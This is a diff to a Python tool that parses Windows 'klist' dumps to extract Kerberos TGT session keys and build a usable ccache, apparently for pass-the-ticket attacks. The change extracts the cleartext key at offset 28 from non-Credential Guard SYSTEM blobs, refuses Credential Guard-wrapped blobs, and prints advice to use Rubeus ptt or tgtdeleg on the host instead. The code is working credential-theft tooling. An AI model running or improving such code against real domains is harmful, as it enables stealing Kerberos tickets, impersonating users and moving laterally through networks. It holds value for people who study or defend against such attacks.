@@ -136,12 +136,16 @@ def parse_klist(text: str) -> dict:
                 and 0 < tn_off <= len(raw_bytes) - len(_TN)
                 and raw_bytes[tn_off:tn_off + len(_TN)] == _TN
             )
-            # CG: etype from header line; legacy SYSTEM blob: etype@8.
-            etype_in_blob = key_type if cred_guard else struct.unpack_from("<I", raw_bytes, 8)[0]
-            key_sz = _KEY_SIZES.get(etype_in_blob)
-            if key_sz and len(raw_bytes) >= 28 + key_sz:
-                key_type = etype_in_blob
-                key_bytes = raw_bytes[28:28 + key_sz]
+            # Non-CG SYSTEM blob: etype@8, cleartext key@28 — extract it.
+            # CG blob: the key material is wrapped/encrypted (protected in VTL1)
+            # and is NOT recoverable offline, so do not treat offset-28 bytes as a
+            # key. key_type stays from the "KeyType 0x.." header for display only.
+            if not cred_guard:
+                etype_in_blob = struct.unpack_from("<I", raw_bytes, 8)[0]
+                key_sz = _KEY_SIZES.get(etype_in_blob)
+                if key_sz and len(raw_bytes) >= 28 + key_sz:
+                    key_type = etype_in_blob
+                    key_bytes = raw_bytes[28:28 + key_sz]
         if not key_bytes:
             expected = _KEY_SIZES.get(key_type, 32)
             if len(raw_bytes) == expected:
@@ -377,15 +381,20 @@ def main() -> None:
         info["key_data"] = key
         info["key_type"] = etype
         print(f"[*] Key extracted from {args.ref}  etype={etype}  ({len(key)} bytes)")
+    elif info.get("cred_guard"):
+        print("[-] Session key is Credential Guard-protected and cannot be exported.", file=sys.stderr)
+        print("[-] klist only emits the wrapped KerberosKeyWithMetadata blob; the unwrap key", file=sys.stderr)
+        print("[-] never leaves the secure kernel (VTL1), so no usable ccache can be built", file=sys.stderr)
+        print("[-] from this dump. Options:", file=sys.stderr)
+        print("[-]   - pass the real key via -K <hex> if obtained another way, or", file=sys.stderr)
+        print("[-]   - use the TGT on the CG host itself (e.g. Rubeus ptt / tgtdeleg).", file=sys.stderr)
+        sys.exit(2)
     elif all(b == 0 for b in info["key_data"]):
         print("[!] WARNING: session key is all-zeros — output will fail with BAD_INTEGRITY", file=sys.stderr)
         print("[!] Run klist as SYSTEM:  klist tgt -li 0x<LogonId>", file=sys.stderr)
 
     # Print parsed info
     key_display = "(all-zeros!)" if all(b == 0 for b in info["key_data"]) else info["key_data"].hex()
-    if info.get("cred_guard"):
-        print("[*] Credential Guard KerberosKeyWithMetadata blob detected — using header etype.")
-
     print(f"\n[*] Parsed ticket:")
     print(f"    client     : {info['client']}@{info['realm']}")
     print(f"    server     : {'/'.join(info['sname'])}@{info['realm']}")
